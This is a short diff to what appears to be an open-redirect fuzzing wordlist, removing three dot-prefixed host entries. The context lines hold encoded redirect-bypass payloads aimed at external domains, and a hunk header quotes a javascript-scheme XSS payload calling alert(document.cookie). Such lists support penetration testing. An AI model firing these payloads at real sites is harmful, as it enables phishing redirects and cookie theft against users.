@@ -4,7 +4,6 @@
 /%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
 /%5cexample.com
 /%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
-/.example.com
 //%09/example.com
 //%5cexample.com
 ///%09/example.com
@@ -554,7 +553,6 @@ javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 /%2f%2flocaldomain.pw
 /localdomain.pw/%2f%2e%2e
 /http:/localdomain.pw
-/.localdomain.pw
 http://.localdomain.pw
 .localdomain.pw
 ///\;@localdomain.pw
@@ -831,7 +829,6 @@ javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 /%2f%2fgoogle.com
 /google.com/%2f%2e%2e
 /http:/google.com
-/.google.com
 ///\;@google.com
 ///google.com
 /////google.com/
